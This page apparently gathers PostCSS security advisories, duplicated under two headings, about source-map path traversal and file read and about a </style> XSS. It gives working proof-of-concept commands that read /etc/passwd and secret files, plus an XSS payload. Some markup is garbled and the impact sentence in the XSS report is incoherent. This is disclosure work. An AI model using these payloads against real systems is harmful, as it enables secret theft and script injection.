# bistromapa.app

## 1

Vulnerability Details
File: lib/previous-map.js
Line: 87-98 (loadFile), 129-144 (loadMap)

Root Cause
PostCSS auto-detects a /_# sourceMappingURL=... _/ comment inside the CSS text it is asked to parse and, unless the caller explicitly passes map: false, attempts to load that path from disk as a "previous source map." This happens on every postcss.parse() / postcss().process() call by default (opt-out, not opt-in).

loadMap() builds the candidate path via join(dirname(opts.from), annotation), where annotation is the raw, attacker-controlled string from the CSS comment. path.join() normalizes but does not sandbox .. segments, so a ../../../ prefix walks the resolved path outside the intended directory. If opts.from is not set at all, the annotation is used completely unmodified — an absolute path in the CSS comment is read verbatim.

8.5.12 already fixed a strictly worse variant of this (any file, any extension, could be read) by requiring the resolved path to end in .map (loadFile()). That fix did not address the traversal itself, only the target extension. Since the join(dirname(file), map) logic has existed unchanged since PostCSS 8.0.0 (Feb 2020), any file ending in .map remains readable through this path in the current release (8.5.16).

Once loaded, MapGenerator.isMap() treats the mere presence of a loaded "previous map" as an implicit request to generate result.map, even when the caller never set the map option. If the loaded map has a sourcesContent field (common for maps emitted by bundlers/transpilers), that content is merged into result.map and returned to the caller — disclosing the traversed-to file's content to whoever supplied the CSS.

## 2

Summary
PostCSS's PreviousMap parses the /_# sourceMappingURL=PATH _/ comment from any CSS string passed to process() and dereferences PATH against the local filesystem with no scheme, allowlist, or traversal check. An attacker who controls the CSS input can cause the host process to read any file readable by Node and leak the first ~10 bytes of its content through the resulting JSON.parse SyntaxError message. The bug also yields a precise file-existence oracle and a controllable-read primitive that may be combined with large-file targets for DoS. The behaviour is triggered with PostCSS's default options — no from, no map, no plugins required — and is therefore reachable from any pipeline that runs untrusted CSS through PostCSS (CMS themes, user-uploaded styles, browser-extension/userstyle processors, build pipelines for third-party packages, blog comment renderers, etc.).

Details
The dangerous chain lives in lib/previous-map.js and is wired into every Input construction at lib/input.js:70-77.

Input constructor (lib/input.js:70-77):

if (pathAvailable && sourceMapAvailable) {
let map = new PreviousMap(this.css, opts)
if (map.text) {
this.map = map
let file = map.consumer().file
if (!this.file && file) this.file = this.mapResolve(file)
}
}
PreviousMap constructor (lib/previous-map.js:17-29):

constructor(css, opts) {
if (opts.map === false) return
this.loadAnnotation(css)
this.inline = this.startWith(this.annotation, 'data:')

let prev = opts.map ? opts.map.prev : undefined
let text = this.loadMap(opts.from, prev)
...
}
Note opts.map === false is the only short-circuit. With default options (opts.map === undefined), the rest of the constructor — including the filesystem read — executes.

loadAnnotation (lib/previous-map.js:72-84) extracts the URL without sanitisation:

loadAnnotation(css) {
let comments = css.match(/\/\*\s*# sourceMappingURL=/g)
if (!comments) return
let start = css.lastIndexOf(comments.pop())
let end = css.indexOf('*/', start)
if (start > -1 && end > -1) {
this.annotation = this.getAnnotationURL(css.substring(start, end))
}
}
getAnnotationURL (lib/previous-map.js:59-61) only strips the /\*# sourceMappingURL= prefix and trims whitespace — no scheme check, no path normalisation, no allowlist.

loadMap (lib/previous-map.js:124-128) — when prev is absent and the annotation is not an inline data: URI:

} else if (this.annotation) {
let map = this.annotation
if (file) map = join(dirname(file), map)
return this.loadFile(map)
}
If opts.from is unset, file is undefined and the raw attacker-supplied path (e.g. /etc/passwd) is used directly.
If opts.from is set, path.join(dirname(file), attackerPath) is used. path.join does not block .. segments, so ../../../../../etc/passwd resolves outside the intended directory.
loadFile (lib/previous-map.js:86-92) is the sink:

loadFile(path) {
this.root = dirname(path)
if (existsSync(path)) {
this.mapFile = path
return readFileSync(path, 'utf-8').toString().trim()
}
}
The bytes are stored in this.text. Input immediately invokes map.consumer() (lib/input.js:74), which constructs a SourceMapConsumer (lib/previous-map.js:33). When the file is not valid source-map JSON (the common case), source-map-js calls JSON.parse, and V8's SyntaxError message embeds the first ~10 bytes of the file content:

Unexpected token 'r', "root:x:0:0"... is not valid JSON
This error is propagated back to the caller. Any application that surfaces PostCSS errors (logs, HTTP 500 responses, build-tool output, debug pages) discloses those bytes to the attacker.

Trust-boundary analysis:

Attacker controls: CSS input passed to postcss().process(css, opts?).
Server resources: any file readable by the Node process — typically including app config, environment files, SSH keys, /etc/passwd, /proc/self/environ, etc.
No mitigations: there is no path validation, scheme allowlist, traversal check, or symlink check. The only relevant check (startWith(annotation, 'data:')) routes inline URIs to decodeInline; everything else hits loadFile.
Primitives obtained:

(a) Arbitrary file read — bytes loaded into Node memory.
(b) Information disclosure — first ~10 bytes leaked via JSON.parse SyntaxError message.
(c) File-existence oracle — non-existent paths return silently from loadFile (existsSync is false → returns undefined → no map text → no consumer call → no error). Existent non-JSON paths throw. Existent JSON paths succeed silently. Three distinguishable states.
(d) DoS primitive — directing the read at /dev/zero, very large files, or device files can stall or crash the process.
PoC
All commands executed against this repository's HEAD (postcss 8.5.10) on Node v22.12.0.

Vector 1 — Absolute path, default options (no from, no map):

$ node -e 'const p=require("postcss"); \
 try { p().process("a{color:red}\n/_# sourceMappingURL=/etc/passwd _/"); } \
 catch(e){console.log(e.message)}'
Unexpected token 'r', "root:x:0:0"... is not valid JSON
The first 10 bytes of /etc/passwd (root:x:0:0) are leaked.

Vector 2 — Relative .. traversal with opts.from set (simulates a build pipeline that pins from to the source file):

$ node -e 'const p=require("postcss"); \
 p().process("a{color:red}\n/_# sourceMappingURL=../../../../../etc/passwd _/", \
 {from:"/var/www/html/styles/main.css", map:{inline:false}}) \
 .catch(e=>console.log(e.message))'
Unexpected token 'r', "root:x:0:0"... is not valid JSON
path.join('/var/www/html/styles', '../../../../../etc/passwd') resolves to /etc/passwd.

Vector 3 — File-existence oracle:

Existing non-JSON file → throws (file confirmed to exist)

$ node -e 'require("postcss")().process("a{}\n/_# sourceMappingURL=/etc/passwd _/")'
SyntaxError: Unexpected token 'r', "root:x:0:0"... is not valid JSON

Non-existent file → returns silently (file confirmed absent)

$ node -e 'r=require("postcss")().process("a{}\n/_# sourceMappingURL=/no/such/file _/"); console.log("ok")'
ok
Vector 4 — Custom file-content leak:

$ printf 'API*KEY=sk-secret-12345\n' > /tmp/server-secret.env
$ node -e 'require("postcss")().process("a{}\n/*# sourceMappingURL=/tmp/server-secret.env \_/")' 2>&1 | head -1
SyntaxError: Unexpected token 'A', "API_KEY=sk"... is not valid JSON
The first 10 bytes of /tmp/server-secret.env (API_KEY=sk) are leaked — sufficient to confirm a token's presence and, in many cases, recover its prefix.

Filesystem-call trace (proves the read happens with no opts at all):

const fs = require('fs');
const orig = fs.readFileSync;
fs.readFileSync = function(p){
if (typeof p==='string' && p.startsWith('/etc')) console.log('[FILE READ]:', p);
return orig.apply(this, arguments);
};
require('postcss')().process('a{}\n/_# sourceMappingURL=/etc/hostname _/');
// → [FILE READ]: /etc/hostname
// → SyntaxError: Unexpected token 'D', "Debian-tri"... is not valid JSON
Impact
Arbitrary file read of any file readable by the Node process from any CSS-processing context that accepts attacker-influenced CSS. PostCSS has hundreds of millions of weekly npm downloads and is the standard CSS processor for build tools (webpack postcss-loader, vite, parcel, Next.js, Gatsby, etc.) and for runtime CSS-handling libraries (CSS Modules tools, CSS minifiers, theme processors). Any pipeline that runs untrusted user CSS — CMS theme uploads, user-styled blog posts, browser-extension/userstyle services, multi-tenant build farms, third-party-package build pipelines — is exposed.
Confidentiality leak of the first ~10 bytes of the targeted file via JSON.parse SyntaxError. This is enough to recover SSH-key headers, environment-variable prefixes (API_KEY=sk…), /etc/passwd records, the start of /proc/self/environ, and other high-value secrets, and to fingerprint the host (Debian-tri… from /etc/hostname).
File-existence oracle with three distinguishable response states (silent success, JSON.parse error, no-such-file silence), enabling reconnaissance of the host filesystem layout and confirmation of installed software, user accounts, and configuration files.
DoS by targeting /dev/zero, /proc/kcore, very large files, or named pipes — readFileSync is a synchronous, unbounded read.
Default-on: triggered with postcss().process(css) and no options. The only configuration that disables the bug is the explicit, undocumented-for-this-purpose { map: false }.
Recommended Fix
The root cause is that loadFile accepts any path the attacker supplies inside a CSS comment. The annotation is meant for tooling, not for production CSS processing of untrusted input. Two layered fixes:

Refuse traversal/absolute paths in loadMap (defence-in-depth):

// lib/previous-map.js
loadMap(file, prev) {
if (prev === false) return false
if (prev) { /_ unchanged _/ }
else if (this.inline) {
return this.decodeInline(this.annotation)
} else if (this.annotation) {
let annotation = this.annotation
// Reject schemes (other than data:, handled above) and absolute paths.
if (/^[a-zA-Z][a-zA-Z0-9+.-]\*:/.test(annotation)) return
if (require('path').isAbsolute(annotation)) return
if (!file) return // No base path → cannot safely resolve.
const base = require('path').resolve(require('path').dirname(file))
const resolved = require('path').resolve(base, annotation)
// Refuse anything that escapes the base directory.
if (resolved !== base && !resolved.startsWith(base + require('path').sep)) {
return
}
return this.loadFile(resolved)
}
}
Require explicit opt-in to follow on-disk source-map annotations: gate the loadFile(map) call in loadMap behind an option such as opts.map.annotation === true or opts.map.followAnnotation === true. Today, the only way to opt out is { map: false }, which also disables in-memory previous-map handling. Inverting the default — only follow disk-resident annotations when explicitly asked — eliminates the entire attack surface for callers that pass untrusted CSS, while preserving build-tool use cases where the annotation is trusted.

A user-facing changelog entry should warn that postcss().process(untrustedCss) previously read attacker-controlled paths, and recommend auditing applications that surfaced PostCSS errors to end users.

## 3

The fix for GHSA-6g55-p6wh-862q added a guard in lib/previous-map.js PreviousMap.loadFile() that restricts an attacker-controlled sourceMappingURL (from a CSS comment) to a .map extension and, for untrusted maps, rejects .. traversal and absolute paths. The traversal/absolute rejection is nested inside if (cssFile) { ... }. When PostCSS is invoked without the from option, cssFile is falsy and that branch is skipped, leaving only the .map extension check.

PreviousMap is constructed by lib/input.js whenever pathAvailable && sourceMapAvailable (under Node with source-map available), independent of opts.from/opts.map (the constructor returns early only for opts.map === false). So postcss([]).process(css) on attacker CSS reaches loadFile with cssFile undefined, and an attacker /_# sourceMappingURL=/abs/path/x.map _/ (or ../-traversing path) is read via readFileSync. When the file is valid JSON, its sources (filesystem paths) and sourcesContent (source contents) are disclosed in the generated source map.

## 4

ostCSS: XSS via Unescaped </style> in CSS Stringify Output
Summary
PostCSS v8.5.5 (latest) does not escape </style> sequences when stringifying CSS ASTs. When user-submitted CSS is parsed and re-stringified for embedding in HTML <style> tags, </style> in CSS values breaks out of the style context, enabling XSS.

Proof of Concept
const postcss = require('postcss');

// Parse user CSS and re-stringify for page embedding
const userCSS = 'body { content: "</style><script>alert(1)</script><style>"; }';
const ast = postcss.parse(userCSS);
const output = ast.toResult().css;
const html = `<style>${output}</style>`;

console.log(html);
// <style>body { content: "</style><script>alert(1)</script><style>"; }</style>
//
// Browser: </style> closes the style tag, <script> executes

# console.bistromapa.app

## 1

Vulnerability Details
File: lib/previous-map.js
Line: 87-98 (loadFile), 129-144 (loadMap)

Root Cause
PostCSS auto-detects a /_# sourceMappingURL=... _/ comment inside the CSS text it is asked to parse and, unless the caller explicitly passes map: false, attempts to load that path from disk as a "previous source map." This happens on every postcss.parse() / postcss().process() call by default (opt-out, not opt-in).

loadMap() builds the candidate path via join(dirname(opts.from), annotation), where annotation is the raw, attacker-controlled string from the CSS comment. path.join() normalizes but does not sandbox .. segments, so a ../../../ prefix walks the resolved path outside the intended directory. If opts.from is not set at all, the annotation is used completely unmodified — an absolute path in the CSS comment is read verbatim.

8.5.12 already fixed a strictly worse variant of this (any file, any extension, could be read) by requiring the resolved path to end in .map (loadFile()). That fix did not address the traversal itself, only the target extension. Since the join(dirname(file), map) logic has existed unchanged since PostCSS 8.0.0 (Feb 2020), any file ending in .map remains readable through this path in the current release (8.5.16).

Once loaded, MapGenerator.isMap() treats the mere presence of a loaded "previous map" as an implicit request to generate result.map, even when the caller never set the map option. If the loaded map has a sourcesContent field (common for maps emitted by bundlers/transpilers), that content is merged into result.map and returned to the caller — disclosing the traversed-to file's content to whoever supplied the CSS.

## 2

Summary
PostCSS's PreviousMap parses the /_# sourceMappingURL=PATH _/ comment from any CSS string passed to process() and dereferences PATH against the local filesystem with no scheme, allowlist, or traversal check. An attacker who controls the CSS input can cause the host process to read any file readable by Node and leak the first ~10 bytes of its content through the resulting JSON.parse SyntaxError message. The bug also yields a precise file-existence oracle and a controllable-read primitive that may be combined with large-file targets for DoS. The behaviour is triggered with PostCSS's default options — no from, no map, no plugins required — and is therefore reachable from any pipeline that runs untrusted CSS through PostCSS (CMS themes, user-uploaded styles, browser-extension/userstyle processors, build pipelines for third-party packages, blog comment renderers, etc.).

## 3

Summary
The fix for GHSA-6g55-p6wh-862q added a guard in lib/previous-map.js PreviousMap.loadFile() that restricts an attacker-controlled sourceMappingURL (from a CSS comment) to a .map extension and, for untrusted maps, rejects .. traversal and absolute paths. The traversal/absolute rejection is nested inside if (cssFile) { ... }. When PostCSS is invoked without the from option, cssFile is falsy and that branch is skipped, leaving only the .map extension check.

PreviousMap is constructed by lib/input.js whenever pathAvailable && sourceMapAvailable (under Node with source-map available), independent of opts.from/opts.map (the constructor returns early only for opts.map === false). So postcss([]).process(css) on attacker CSS reaches loadFile with cssFile undefined, and an attacker /_# sourceMappingURL=/abs/path/x.map _/ (or ../-traversing path) is read via readFileSync. When the file is valid JSON, its sources (filesystem paths) and sourcesContent (source contents) are disclosed in the generated source map.

Affected code (v8.5.22 — the release carrying the GHSA-6g55 fix)
// lib/previous-map.js
loadFile(path, cssFile, trusted) {
if (!trusted && !this.unsafeMap) {
if (!/\.map$/i.test(path)) {
return undefined
}
if (cssFile) { // guard runs ONLY when `from` is set
let relativePath = relative(dirname(cssFile), path)
if (relativePath === '..' ||
relativePath.startsWith('..' + sep) ||
isAbsolute(relativePath)) {
return undefined
}
}
}
this.root = dirname(path)
if (existsSync(path)) {
this.mapFile = path
return readFileSync(path, 'utf-8').toString().trim() // sink
}
}

// loadMap(): untrusted annotation path, trusted=false; file === opts.from
} else if (this.annotation) {
let map = this.annotation
if (file) map = join(dirname(file), map) // no `from` -> map stays the raw URL
let unknown = this.loadFile(map, file, false) // file undefined -> cssFile falsy
Proof of concept (verified on postcss 8.5.22)
const postcss = require('postcss')
const fs = require('fs')

// a 'secret' sourcemap OUTSIDE any expected tree (stand-in for another project's .map)
const secret = '/tmp/pcpoc/secret_out_of_tree.map'
fs.writeFileSync(secret, JSON.stringify({
version: 3, sources: ['/etc/REAL_PATH_LEAK'], mappings: '', names: [],
sourcesContent: ['TOP_SECRET_abcdef']
}))

const css = 'a{color:red}\n/_# sourceMappingURL=' + secret + ' _/'
const leaks = m => m && JSON.stringify(m.toJSON ? m.toJSON() : m).includes('TOP_SECRET_abcdef')

;(async () => {
// A) NO `from` -> guard skipped -> arbitrary absolute .map read + disclosed
const a = await postcss([]).process(css, { map: true })
console.log('no from -> leaked:', !!leaks(a.map)) // true

// B) WITH `from` -> guard active -> blocked
const b = await postcss([]).process(css, { from: '/tmp/pcpoc/in.css', map: true })
console.log('with from -> leaked:', !!leaks(b.map)) // false
})()

## 4

PostCSS: XSS via Unescaped </style> in CSS Stringify Output
Summary
PostCSS v8.5.5 (latest) does not escape </style> sequences when stringifying CSS ASTs. When user-submitted CSS is parsed and re-stringified for embedding in HTML <style> tags, </style> in CSS values breaks out of the style context, enabling XSS.

Proof of Concept
const postcss = require('postcss');

// Parse user CSS and re-stringify for page embedding
const userCSS = 'body { content: "</style><script>alert(1)</script><style>"; }';
const ast = postcss.parse(userCSS);
const output = ast.toResult().css;
const html = `<style>${output}</style>`;

console.log(html);
// <style>body { content: "</style><script>alert(1)</script><style>"; }</style>
//
// Browser: </style> closes the style tag, <script> executes
Tested output (Node.js v22, postcss v8.5.5):

Input: body { content: "</style><script>alert(1)</script><style>"; }
Output: body { content: "</style><script>alert(1)</script><style>"; }
Contains </style>: true
Impact
Impact non-bundler use cases since bundlers for XSS on their own. Requires some PostCSS plugin to have malware code, which can inject XSS to website.

Suggested Fix
Escape </style in all stringified output values:

output = output.replace(/<\/(style)/gi, '<\\/$1');
